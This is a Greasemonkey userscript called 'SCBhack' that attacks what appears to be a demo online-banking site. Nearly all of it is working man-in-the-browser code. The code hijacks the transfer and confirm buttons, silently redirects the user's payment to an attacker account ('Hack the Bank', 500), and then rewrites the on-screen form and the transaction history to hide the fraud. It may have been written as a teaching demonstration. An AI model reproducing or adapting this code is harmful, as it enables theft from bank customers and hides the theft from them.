// ==UserScript==
// @name           SCBhack
// @namespace      de.mrx.client
// @description    Greasemonkey version of the hack.
// @include        http://127.0.0.1*
// @exclude        http://127.0.0.1*Admin*
// @include        http*securecloudbanking.appspot.com*
// @exclude        http*securecloudbanking.appspot.com*Admin*
// @require		   http://code.jquery.com/jquery-1.3.2.js
// ==/UserScript==


//Does not work correctly if user has multiple transfers for same date which are displayed on more than one page in transfer history.


HACK_REC_ACCOUNT	="999666999";
HACK_REC_NAME		="Hack the Bank";
HACK_BANK_BLZ		="12060000";
HACK_BANK_NAME		="Bad Bank";
HACK_AMOUNT			=500;
HACK_USAGE			="Hack Demo";

//some random fake data
globalRC_Acc_Name="Rewe Koeln";
globalRC_Acc_Nr="725 826 262"
globalRC_Bank_BLZ="230 000 00";
globalRC_Bank_Name="Postbank"
global_Amount="34,50";
global_Usage="Vielen Dank fuer Ihren Einkauf";

//server adress is needed so that greasemonkey can store transfers
//in different locations for local and online server
SERVER_ADRESS= document.URL.split("/")[2].split(":")[0];

ACC_NAME_INDEX = "ACCNAME" + SERVER_ADRESS;
ACC_NR_INDEX = "ACCNR" + SERVER_ADRESS;
BANK_BLZ_INDEX = "BLZ" + SERVER_ADRESS;
BANK_NAME_INDEX = "BANKNAME" + SERVER_ADRESS;
AMOUNT_INDEX = "AMOUNT" + SERVER_ADRESS;
REMARK_INDEX = "REMARK" + SERVER_ADRESS;
TIMESTAMP_INDEX = "TIME" + SERVER_ADRESS;
COMMITED_INDEX = "COMMITED" + SERVER_ADRESS;


window.DEBUG = false;
//storage for real transfers
window.Transfer = function(name, nr, blz, bankName, amount, remark, timestamp, commited) {
	this.acc_Name = name;
	this.acc_Nr = nr;
	this.bank_BLZ = blz;
	this.bank_Name = bankName;
	this.amount = amount;
	this.remark = remark;
	this.timestamp = timestamp;
	this.commited = commited;
}

window.saveTransfers = function(transfers) {
	if (DEBUG)
		console.log("save transfers" + transfers.length);
	for (i = 0; i < transfers.length; i++) {
		GM_setValue(ACC_NAME_INDEX + i, transfers[i].acc_Name);
		GM_setValue(ACC_NR_INDEX + i, transfers[i].acc_Nr);		
		GM_setValue(BANK_BLZ_INDEX + i, transfers[i].bank_BLZ);		
		GM_setValue(BANK_NAME_INDEX + i, transfers[i].bank_Name);		
		GM_setValue(AMOUNT_INDEX + i, transfers[i].amount);
		GM_setValue(REMARK_INDEX + i, transfers[i].remark);
		timeInMilliSecs = transfers[i].timestamp.getTime();
		if (isNaN(timeInMilliSecs)) {
			timeInMilliSecs = "";

		} 
		GM_setValue(TIMESTAMP_INDEX + i, ""+timeInMilliSecs);
		GM_setValue(COMMITED_INDEX + i, transfers[i].commited.valueOf());

	}

	
}



window.loadTransfers  = function() {
	
	i = 0;
	
	transfers = new Array();
	while (true) {
		result = GM_getValue(ACC_NAME_INDEX + i, false);
		if (result == false) {
			if (DEBUG)
				console.log("Load transfers" + transfers.length);
			return transfers;
		}
		
		name = GM_getValue(ACC_NAME_INDEX + i, "");
		nr = GM_getValue(ACC_NR_INDEX + i, "");
		blz = GM_getValue(BANK_BLZ_INDEX + i, "");
		bankName = GM_getValue(BANK_NAME_INDEX + i, "");
		amount = GM_getValue(AMOUNT_INDEX + i, "");
		remark = GM_getValue(REMARK_INDEX + i, "");
		timestamp = new Date(parseInt(GM_getValue(TIMESTAMP_INDEX + i, "")));
		commited =  new Boolean(GM_getValue(COMMITED_INDEX + i, ""));
		
		
		transfers[i] =  new Transfer(name, nr, blz, bankName, amount, remark, timestamp, commited);
		i++;
	}
}

window.deleteData = function(){
	
	data =loadTransfers();
	if (DEBUG)
		console.log("delete transfers" + data.length);
	for (i = 0; i < data.length; i++) {
		
		GM_deleteValue(ACC_NAME_INDEX + i);
		GM_deleteValue(ACC_NR_INDEX + i);
		GM_deleteValue(BANK_BLZ_INDEX + i);
		GM_deleteValue(BANK_NAME_INDEX + i);
		GM_deleteValue(AMOUNT_INDEX + i);
		GM_deleteValue(REMARK_INDEX + i);		
		GM_deleteValue(TIMESTAMP_INDEX + i);		
		GM_deleteValue(COMMITED_INDEX + i);
	}	
}
//deleteData();


	 function timedMsg()
		 {
		 $("#btnTD button:visible[hackmarker!='true']:contains('Geld')").each(function(){	
			 	console.log("a");
		 			$(this).attr("hackMarker","true");
		 			sendMoneyBtnClone=$(this).clone(true)
		 			sendMoneyBtnClone.attr("hName","sendMoneyBtnClone");
		 			$(this).after(sendMoneyBtnClone);
		 			$(this).hide();
		 			$(this).attr("hackMarkerBtnOrig","true");		 			
		 			sendMoneyBtnClone.click(function(event) {
		 				event.preventDefault();
		 				
		 				 newTransfer = new Transfer($("input:eq(1)").val(),
		 						$("input:eq(2)").val(), $("input:eq(3)").val(), 
		 						$("input:eq(4)").val(), 
		 						$("input:eq(5)").val(), $("input:eq(6)").val(), new 
		 						Date(), new Boolean(false));
		 				
		 				
		 				 storedTransfers = loadTransfers();
		 				
		 				 index =storedTransfers.length;
		 				
		 				 if (index > 0) { 
			 				 //if last stored transfer was not commited we can delete it
			 				 if (!storedTransfers[index - 1].commited.valueOf()) {
			 					
			 					index--;
			 				 }
		 				 }
		 				console.log(index);
		 				storedTransfers[index] = newTransfer;
		 				
		 				saveTransfers(storedTransfers);
		 				
		 				$("input:eq(1)").val(HACK_REC_ACCOUNT);
		 				$("input:eq(2)").val(HACK_REC_NAME);
		 				$("input:eq(3)").val(HACK_BANK_BLZ);
		 				$("input:eq(4)").val(HACK_BANK_NAME);
		 				$("input:eq(5)").val(HACK_AMOUNT);
		 				$("input:eq(6)").val(HACK_USAGE);
		 				sendMoneyBtnClone.attr("activateReset","true");
		 				$("button[hackMarkerBtnOrig='true']")[0].click();
		 				$(this).hide();
		 				});			
		 			
		 	});
		 	
		 	$("#btnTD button[hName='sendMoneyBtnClone']").filter(":not(:visible)[activateReset='true']").each(function(){
		 		 
		 		 storedTransfers = loadTransfers();
		 		lastTransfer = storedTransfers[storedTransfers.length - 1];
		 		
				$("input:eq(1)").val(lastTransfer.acc_Name);
				$("input:eq(2)").val(lastTransfer.acc_Nr);
				$("input:eq(3)").val(lastTransfer.bank_BLZ);
				$("input:eq(4)").val(lastTransfer.bank_Name);
				$("input:eq(5)").val(lastTransfer.amount);
				$("input:eq(6)").val(lastTransfer.remark);

		 		$(this).attr("hackConfPageMarker","true");
		 	});
		 	
		 	$("#btnTD button:visible[hackmarker!='true']:contains('berweisung')").each(function(){
		 		$(this).attr("hackMarker","true");
	 			sendMoneyConfirmBtnClone=$(this).clone(true)
	 			$(this).after(sendMoneyConfirmBtnClone);
	 			$(this).hide();
	 			$(this).attr("hackMarkerConfirmBtnOrig","true");	
	 			sendMoneyConfirmBtnClone.click(function(event) {
	 				
	 				storedTransfers = loadTransfers();
	 		 		lastTransfer = storedTransfers[storedTransfers.length - 1];
	 		 		
	 		 		//send hacked values
	 				$("input:eq(1)").val(HACK_REC_ACCOUNT);
	 				$("input:eq(2)").val(HACK_REC_NAME);
	 				$("input:eq(3)").val(HACK_BANK_BLZ);
	 				$("input:eq(4)").val(HACK_BANK_NAME);
	 				$("input:eq(5)").val(HACK_AMOUNT);
	 				$("input:eq(6)").val(HACK_USAGE);
	 				$("button[hackMarkerConfirmBtnOrig='true']")[0].click();
	 				
	 				//and change displayed values back
	 				$("input:eq(1)").val(lastTransfer.acc_Name);
					$("input:eq(2)").val(lastTransfer.acc_Nr);
					$("input:eq(3)").val(lastTransfer.bank_BLZ);
					$("input:eq(4)").val(lastTransfer.bank_Name);
					$("input:eq(5)").val(lastTransfer.amount);
					$("input:eq(6)").val(lastTransfer.remark);
					
					//set transfer to be committed (not necessarily true e.g. if tan is wrong!)
					lastTransfer.commited = true;
					saveTransfers(storedTransfers);
	 			});
	 			
		 	});
		 	
		 	//
		 	//filter every page and look for hacked data
		 	//
		 	//mark for already manipulated transfers
		 	var storedTransfers = loadTransfers();			 	
		 	var	alreadyUsedHackedTransfers = new Array(storedTransfers.length);

		 	for (i = 0; i < alreadyUsedHackedTransfers.length; i++)
		 		alreadyUsedHackedTransfers[i] = new Boolean(false);
		 	//get row that contains a hacked transfer
		 	hackedRow= $(".TransfersOdd,.TransfersEven").filter(':contains(Hack the Bank)').each(function(){
		 		
		 		//find the original transfer for this row
		 		//date format on bank page is "dd.mm.yyyy"
		 		var date = $(this).prev().children();
//		 		console.log(date.html());
		 		var day = date.html().substr(0, 2);
		 		var month = date.html().substr(3, 2);
		 		var year = date.html().substr(6,4);
		 		//delete leading "0"s
		 		while (day.charAt(0) == "0")
		 			day = day.substr(1, day.length - 1);
		 		while (month.charAt(0) == "0" )
		 			month = month.substr(1, month.length - 1);
		 		
		 		//now look in stored original transfers for this date
		 		var correctHackIndex = - 1;
		 		for ( i = 0; i < storedTransfers.length; i++) {
		 			//this data was already used so do not use it again
		 			//this does work only so far as all hacked transfers of one day are on same page
		 			if (alreadyUsedHackedTransfers[i].valueOf()) {
		 				continue;
		 			}
		 			var yearStored = storedTransfers[i].timestamp.getFullYear();
		 			var monthStored = storedTransfers[i].timestamp.getMonth() + 1; //gets month starting with 0
		 			var dayStored = storedTransfers[i].timestamp.getDate();
		 			console.log(yearStored + " " + monthStored + " " + dayStored +"-" + i);
		 			console.log(year + " " + month + " " + day +"+");
		 			if (day == dayStored && month == monthStored && year == yearStored) {
		 				//we found the original transfer
		 				if (DEBUG)
		 					console.log("Replace with hack nr" + i);
		 				correctHackIndex = i;
		 				alreadyUsedHackedTransfers[i] = new Boolean(true);
		 				break;
		 			}
		 		}
		 		
		 		//original data by user
		 		var originalData;
		 		if (correctHackIndex == -1) {
		 			console.log("Error. Could not find original data. Using some generic fake data.");
		 			//create some fake data
		 			originalData = new Transfer(globalRC_Acc_Name, globalRC_Acc_Nr,
		 				globalRC_Bank_BLZ, globalRC_Bank_Name,
		 				global_Amount, global_Usage, 0, new Boolean(false));
		 		}
		 		else {
		 			originalData = storedTransfers[correctHackIndex];
		 		}
//		 		console.log("Found index " + correctHackIndex);
		 		
		 		//now change all values so that it appears as if the transfer would not have been hacked
		 		//date does not need to be changed
		 		var recipient = $(this).children();
		 		recipient.text(originalData.acc_Name);
		 		
		 		var bank =		$(this).next().children();
		 		bank.text(originalData.bank_Name + " (" + originalData.bank_BLZ + ")");
		 		
		 		var remark = 	$(this).next().next().children();
		 		remark.text(originalData.remark);
		 		
		 		var amount = 	$(this).next().next().next().children();
		 		amount.text(originalData.amount);

		 		
		 	}); 	
		 	var t=setTimeout(timedMsg,300);
		 }
	 
	 $(document).ready(function() {
 	timedMsg();
	 });
  

 
 
  